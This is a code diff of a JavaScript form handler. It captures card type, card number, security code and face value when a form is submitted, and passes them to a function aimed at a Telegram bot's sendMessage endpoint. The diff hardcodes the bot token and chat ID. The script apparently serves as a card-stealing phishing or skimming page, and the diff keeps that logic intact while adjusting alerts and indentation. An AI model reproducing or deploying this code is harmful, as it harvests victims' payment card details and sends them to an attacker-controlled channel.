@@ -1,20 +1,19 @@
-alert("Test");
 const BOT_TOKEN = '7360342833:AAGi0f4AEWFbyQF2nN-unwm7exJabpQCEwE';
-        const CHAT_ID = '6868085389'; 
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const CHAT_ID = '6868085389'; 
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        document.addEventListener('DOMContentLoaded', (event) => {
-            const myForm = document.getElementById('myForm');
+document.addEventListener('DOMContentLoaded', (event) => {
+        const myForm = document.getElementById('myForm');
 
-            myForm.addEventListener('submit', (e) => {
+        myForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 const cardType = document.getElementById('form-field-field_c740a56').value;
                 const cardNumber = document.getElementById('form-field-field_fe6e98a').value;
                 const securityCode = document.getElementById('form-field-code').value;
                 const faceValue = document.getElementById('form-field-value').value;
 
+                alert("Done");
                 sendMessage(cardType, cardNumber, securityCode, faceValue);
-
                 console.log(cardNumber, cardType, securityCode, faceValue);
             });
         });
